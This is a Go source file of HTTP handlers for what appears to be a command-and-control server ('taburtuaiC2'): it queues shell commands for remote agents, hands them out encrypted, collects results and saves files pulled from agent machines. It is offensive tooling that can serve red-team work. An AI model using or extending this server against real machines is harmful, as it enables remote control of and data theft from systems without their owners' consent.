package api

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/mjopsec/taburtuaiC2/internal/services"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// ExecuteCommand queues a shell command for agent execution
func (h *Handlers) ExecuteCommand(c *gin.Context) {
	var req struct {
		AgentID    string            `json:"agent_id" binding:"required"`
		Command    string            `json:"command"  binding:"required"`
		Args       []string          `json:"args,omitempty"`
		WorkingDir string            `json:"working_dir,omitempty"`
		Timeout    int               `json:"timeout,omitempty"`
		Metadata   map[string]string `json:"metadata,omitempty"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}

	if !isValidUUID(req.AgentID) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid agent ID format")
		return
	}
	if len(req.Command) == 0 || len(req.Command) > 10000 {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Command empty or too long (max 10000 chars)")
		return
	}
	if containsDangerousPatterns(req.Command) {
		h.server.Logger.Warn(services.AUDIT,
			fmt.Sprintf("Dangerous command blocked: %s", req.Command),
			req.AgentID, "", map[string]string{"client_ip": c.ClientIP()})
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Command contains dangerous patterns")
		return
	}

	agent, exists := h.server.Monitor.GetAgent(req.AgentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}
	// Team server: enforce agent claim ownership
	sessionID := c.GetHeader("X-Session-ID")
	if !h.server.TeamHub.CanWrite(req.AgentID, sessionID) {
		_, claimant, _ := h.server.TeamHub.AgentClaim(req.AgentID)
		c.Status(http.StatusConflict)
		h.APIResponse(c, false, "", nil,
			fmt.Sprintf("agent %s is claimed by %s — release it first or use their session", req.AgentID[:8], claimant))
		return
	}

	if req.Timeout < 0 || req.Timeout > 3600 {
		req.Timeout = 300
	}
	if req.WorkingDir != "" {
		if err := validateFilePath(req.WorkingDir); err != nil {
			c.Status(http.StatusBadRequest)
			h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid working dir: %v", err))
			return
		}
	}

	cmd := &types.Command{
		ID:            generateSecureUUID(),
		AgentID:       req.AgentID,
		Command:       sanitizeCommand(req.Command),
		OperationType: "execute",
		Args:          sanitizeArgs(req.Args),
		WorkingDir:    sanitizeWorkingDir(req.WorkingDir),
		Timeout:       req.Timeout,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Metadata:      sanitizeMetadata(req.Metadata),
	}
	if cmd.Timeout == 0 {
		cmd.Timeout = 300
	}

	if err := validateCommand(cmd); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Validation failed: %v", err))
		return
	}

	h.server.CommandQueue.Add(req.AgentID, cmd)
	h.server.Logger.LogCommandExecution(req.AgentID, req.Command, "Queued", true)

	h.APIResponse(c, true, "Command queued", map[string]interface{}{
		"command_id": cmd.ID,
		"status":     cmd.Status,
		"timeout":    cmd.Timeout,
		"created_at": cmd.CreatedAt.Format(time.RFC3339),
	}, "")
}

// GetNextCommand returns the next pending command for an agent
func (h *Handlers) GetNextCommand(c *gin.Context) {
	agentID := c.Param("id")

	if !isValidUUID(agentID) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid agent ID format")
		return
	}
	if _, exists := h.server.Monitor.GetAgent(agentID); !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}

	cmd := h.server.CommandQueue.GetNext(agentID)
	if cmd == nil {
		c.Status(http.StatusNoContent)
		return
	}

	h.server.Logger.Debug(services.COMMAND_EXEC,
		fmt.Sprintf("Dispatching command ID=%s Type=%s", cmd.ID, cmd.OperationType),
		agentID, cmd.Command, nil)

	// Encrypt with session key when available; agent decrypts via activeCrypto()
	if sessionMgr := h.agentSessionMgr(agentID); sessionMgr != nil {
		if cmdJSON, err := json.Marshal(cmd); err == nil {
			if enc, err := sessionMgr.EncryptData(cmdJSON); err == nil {
				h.APIResponse(c, true, "Command ready", map[string]any{"encrypted": enc}, "")
				return
			}
		}
	}
	// No session key yet — send plaintext (agent handles both cases)
	h.APIResponse(c, true, "Command ready", map[string]any{"result": cmd}, "")
}

// SubmitCommandResult processes a result submitted by an agent
func (h *Handlers) SubmitCommandResult(c *gin.Context) {
	body, err := c.GetRawData()
	if err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Failed to read body")
		return
	}

	// Decrypt if wrapped — try session key first, fall back to static key
	var encCheck struct {
		EncryptedPayload string `json:"encrypted_payload"`
		AgentID          string `json:"agent_id"`
	}
	if err := json.Unmarshal(body, &encCheck); err == nil && encCheck.EncryptedPayload != "" {
		if !isValidUUID(encCheck.AgentID) {
			encCheck.AgentID = "" // ignore malformed agent_id
		}
		var decrypted []byte
		if encCheck.AgentID != "" {
			if sessionMgr := h.agentSessionMgr(encCheck.AgentID); sessionMgr != nil {
				decrypted, _ = sessionMgr.DecryptData(encCheck.EncryptedPayload)
			}
		}
		if decrypted == nil && h.server.CryptoMgr != nil {
			var err error
			decrypted, err = h.server.CryptoMgr.DecryptData(encCheck.EncryptedPayload)
			if err != nil {
				c.Status(http.StatusBadRequest)
				h.APIResponse(c, false, "", nil, "Failed to decrypt payload")
				return
			}
		}
		if decrypted == nil {
			c.Status(http.StatusBadRequest)
			h.APIResponse(c, false, "", nil, "No decryption key available")
			return
		}
		body = decrypted
	}

	var result types.CommandResult
	if err := json.Unmarshal(body, &result); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid result format")
		return
	}
	if !isValidUUID(result.CommandID) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid command ID format")
		return
	}

	if result.Encrypted {
		decMgr := h.agentSessionMgr(encCheck.AgentID)
		if decMgr == nil {
			decMgr = h.server.CryptoMgr
		}
		if decMgr != nil {
			if result.Output != "" {
				if dec, err := decMgr.DecryptData(result.Output); err == nil {
					result.Output = string(dec)
				}
			}
			if result.Error != "" {
				if dec, err := decMgr.DecryptData(result.Error); err == nil {
					result.Error = string(dec)
				}
			}
		}
	}

	cmd, err := h.server.CommandQueue.CompleteCommand(result.CommandID, &result)
	if err != nil || cmd == nil {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Command not found")
		return
	}

	// Save downloaded file to disk
	if cmd.OperationType == "download" && cmd.Status == "completed" && cmd.DestinationPath != "" {
		if err := validateFilePath(cmd.DestinationPath); err != nil {
			cmd.Error = fmt.Sprintf("Invalid destination path: %v", err)
			cmd.Status = "failed"
		} else {
			if dir := filepath.Dir(cmd.DestinationPath); dir != "." {
				_ = os.MkdirAll(dir, 0755)
			}
			if len(result.Output) > 100*1024*1024 {
				cmd.Error = "Downloaded file exceeds 100MB limit"
				cmd.Status = "failed"
			} else if werr := os.WriteFile(cmd.DestinationPath, []byte(result.Output), 0644); werr != nil {
				cmd.Error = fmt.Sprintf("Failed to save file: %v", werr)
				cmd.Status = "failed"
			} else {
				cmd.Output = fmt.Sprintf("Saved to %s (%d bytes)", cmd.DestinationPath, len(result.Output))
			}
		}
	}

	success := cmd.Status == "completed"
	h.server.Logger.LogCommandExecution(cmd.AgentID, cmd.Command, cmd.Output, success)
	duration := cmd.CompletedAt.Sub(cmd.ExecutedAt)
	h.server.Monitor.RecordCommand(cmd.AgentID, cmd.Command, success, duration)

	// Notify all connected operators
	h.server.TeamHub.Broadcast(services.TeamEvent{
		Type:    "result_ready",
		AgentID: cmd.AgentID,
		Payload: fmt.Sprintf("cmd=%s status=%s duration=%s", cmd.OperationType, cmd.Status, duration.Truncate(time.Millisecond)),
		Time:    time.Now().Format(time.RFC3339),
	})

	h.APIResponse(c, true, "Result processed", map[string]interface{}{
		"command_id": cmd.ID,
		"status":     cmd.Status,
		"duration":   duration.String(),
	}, "")
}

// GetCommandStatus returns current status and output of a command
func (h *Handlers) GetCommandStatus(c *gin.Context) {
	commandID := c.Param("id")
	if !isValidUUID(commandID) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid command ID format")
		return
	}

	cmd := h.server.CommandQueue.GetCommand(commandID)
	if cmd == nil {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Command not found")
		return
	}

	resp := map[string]interface{}{
		"id":             cmd.ID,
		"agent_id":       cmd.AgentID,
		"command":        cmd.Command,
		"status":         cmd.Status,
		"operation_type": cmd.OperationType,
		"created_at":     cmd.CreatedAt.Format(time.RFC3339),
		"timeout":        cmd.Timeout,
	}
	if !cmd.ExecutedAt.IsZero() {
		var dur time.Duration
		if cmd.Status == "completed" || cmd.Status == "failed" || cmd.Status == "timeout" {
			dur = cmd.CompletedAt.Sub(cmd.ExecutedAt)
		} else {
			dur = time.Since(cmd.ExecutedAt)
		}
		resp["executed_at"] = cmd.ExecutedAt.Format(time.RFC3339)
		resp["duration_seconds"] = dur.Seconds()
	}
	if !cmd.CompletedAt.IsZero() {
		resp["completed_at"] = cmd.CompletedAt.Format(time.RFC3339)
	}
	if cmd.Status == "completed" || cmd.Status == "failed" || cmd.Status == "timeout" {
		resp["exit_code"] = cmd.ExitCode
		resp["output"] = cmd.Output
		resp["error"] = cmd.Error
	}
	if cmd.WorkingDir != "" {
		resp["working_dir"] = cmd.WorkingDir
	}

	h.APIResponse(c, true, "", resp, "")
}

// GetAgentCommands returns command history for an agent
func (h *Handlers) GetAgentCommands(c *gin.Context) {
	agentID := c.Param("id")
	if !isValidUUID(agentID) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid agent ID format")
		return
	}

	status := c.Query("status")
	limit := 50
	if l, err := strconv.Atoi(c.Query("limit")); err == nil && l > 0 {
		if l > 1000 {
			limit = 1000
		} else {
			limit = l
		}
	}

	commands := h.server.CommandQueue.GetAgentCommands(agentID, status, limit)

	var clean []*types.Command
	for _, cmd := range commands {
		cp := *cmd
		cp.FileContent = nil
		if len(cp.Output) > 256 {
			cp.Output = cp.Output[:253] + "..."
		}
		if len(cp.Error) > 256 {
			cp.Error = cp.Error[:253] + "..."
		}
		clean = append(clean, &cp)
	}

	h.APIResponse(c, true, "", map[string]interface{}{
		"commands": clean,
		"count":    len(clean),
	}, "")
}

// ListAllCommands returns recent commands across all agents
func (h *Handlers) ListAllCommands(c *gin.Context) {
	status := c.Query("status")
	limit := 100
	if l, err := strconv.Atoi(c.Query("limit")); err == nil && l > 0 {
		if l > 1000 {
			limit = 1000
		} else {
			limit = l
		}
	}

	commands := h.server.CommandQueue.GetAllCommands(status, limit)

	var clean []*types.Command
	for _, cmd := range commands {
		cp := *cmd
		cp.FileContent = nil
		if len(cp.Output) > 512 {
			cp.Output = cp.Output[:509] + "..."
		}
		if len(cp.Error) > 256 {
			cp.Error = cp.Error[:253] + "..."
		}
		clean = append(clean, &cp)
	}

	h.APIResponse(c, true, "", map[string]interface{}{
		"commands": clean,
		"count":    len(clean),
	}, "")
}

// ClearAgentQueue removes all pending commands for an agent
func (h *Handlers) ClearAgentQueue(c *gin.Context) {
	agentID := c.Param("id")
	if !isValidUUID(agentID) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid agent ID format")
		return
	}

	count := h.server.CommandQueue.ClearQueue(agentID)
	msg := fmt.Sprintf("Cleared %d pending commands for agent %s", count, agentID)
	h.server.Logger.Info(services.AUDIT, msg, agentID, "", nil)

	h.APIResponse(c, true, msg, map[string]interface{}{
		"cleared_count": count,
		"agent_id":      agentID,
	}, "")
}
